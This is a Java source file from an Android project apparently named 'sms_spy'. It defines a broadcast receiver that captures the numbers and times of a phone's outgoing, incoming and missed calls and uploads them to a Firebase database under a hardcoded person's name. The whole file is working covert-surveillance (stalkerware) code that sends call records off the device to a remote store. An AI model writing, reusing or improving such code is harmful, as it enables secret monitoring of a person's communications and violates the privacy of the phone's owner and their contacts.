package com.example.moonc.sms_spy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Date;

/**
 * Created by moonc on 11/9/2017.
 */

public class Outgoing_calls extends BroadcastReceiver {

    private static int lastState = TelephonyManager.CALL_STATE_IDLE;
    private static Date callStartTime;
    private static boolean isIncoming;
    private static String savedNumber;
    boolean b = true;
    String name = "Pushpo";
    long time,time_;

    public void onReceive(Context context, Intent intent) {
        String number;
        int state = 0;


//        SharedPreferences sharedPreferences = context.getSharedPreferences("Login_details",MODE_PRIVATE);
//        name = sharedPreferences.getString("name", "NAME");

        if(intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")){
             number  = intent.getExtras().getString("android.intent.extra.PHONE_NUMBER");

        }else
        {
            String stateStr = intent.getExtras().getString(TelephonyManager.EXTRA_STATE);
            number = intent.getExtras().getString(TelephonyManager.EXTRA_INCOMING_NUMBER);

            if(stateStr.equals(TelephonyManager.EXTRA_STATE_IDLE)){
                state = TelephonyManager.CALL_STATE_IDLE;
            }
            else if(stateStr.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)){
                state = TelephonyManager.CALL_STATE_OFFHOOK;
            }
            else if(stateStr.equals(TelephonyManager.EXTRA_STATE_RINGING)){
                state = TelephonyManager.CALL_STATE_RINGING;
            }
            b = false;
            onCallStateChanged(context, state, number);


        }

       if(b) {
         //  Toast.makeText(context, name, Toast.LENGTH_SHORT).show();
           callStartTime = new Date();
           String Fianl_Str = number + "@@@" + callStartTime;

         //  if(!name.equals("NAME")&& !name.isEmpty()) {
               FirebaseDatabase firebaseDatabase = FirebaseDatabase.getInstance();
               DatabaseReference databaseReference = firebaseDatabase.getReference().child(name).child("Outgoing_calls");
               databaseReference.push().setValue(Fianl_Str);
         //  }
          // Toast.makeText(context, Fianl_Str, Toast.LENGTH_SHORT).show();
       }

    }

    public void onCallStateChanged(Context context, int state, String number) {
        FirebaseDatabase firebaseDatabase = FirebaseDatabase.getInstance();



        if(lastState == state){
            //No change, debounce extras
            return;
        }
        switch (state) {
            case TelephonyManager.CALL_STATE_RINGING:
                isIncoming = true;
                callStartTime = new Date();
                savedNumber = number;
               Toast.makeText(context, "Incoming Call Ringing" , Toast.LENGTH_SHORT).show();

                time = System.currentTimeMillis();
              Toast.makeText(context,Long.toString(time),Toast.LENGTH_LONG).show();



                break;
            case TelephonyManager.CALL_STATE_OFFHOOK:
                //Transition of ringing->offhook are pickups of incoming calls.  Nothing done on them
                if(lastState != TelephonyManager.CALL_STATE_RINGING){
                    isIncoming = false;
                    callStartTime = new Date();
                  //  Toast.makeText(context, "Outgoing Call Started" , Toast.LENGTH_SHORT).show();
                }

                break;
            case TelephonyManager.CALL_STATE_IDLE:
                //Went to idle-  this is the end of a call.  What type depends on previous state(s)
                if(lastState == TelephonyManager.CALL_STATE_RINGING){
                    //Ring but no pickup-  a miss
                   // Toast.makeText(context, "Ringing but no pickup\n" + savedNumber + "\n Call time " + callStartTime +" \nDate " + new Date() , Toast.LENGTH_SHORT).show();
                    if(!name.equals("NAME")&& !name.isEmpty()) {
                        String Fianl_Str = savedNumber + "@@@" + callStartTime;
                        DatabaseReference databaseReference = firebaseDatabase.getReference().child(name).child("Missed_calls");
                        databaseReference.push().setValue(Fianl_Str);
                    }

                }
                else if(isIncoming){

                    time_ = System.currentTimeMillis();
                    Log.d("call end",Long.toString(time_));
                   // Toast.makeText(context,Long.toString(time_),Toast.LENGTH_LONG).show();

                    long elapsed = (time_ - time);

                    String display = String.format("%02d:%02d:%02d", elapsed / 3600, (elapsed % 3600) / 60, (elapsed % 60));
                 //   Toast.makeText(context,display,Toast.LENGTH_LONG).show();




                  //  Toast.makeText(context, "Incoming " + savedNumber + " \nCall time " + callStartTime + "\nDuration :" + elapsed  , Toast.LENGTH_SHORT).show();
                    String Fianl_Str = savedNumber + "@@@"+ callStartTime ;
                    if(!name.equals("NAME")) {
                        DatabaseReference databaseReference = firebaseDatabase.getReference().child(name).child("Incoming_calls");
                        databaseReference.push().setValue(Fianl_Str);
                    }

                }
                else{
                        b = true;

                }

                break;
        }
        lastState = state;

    }

}
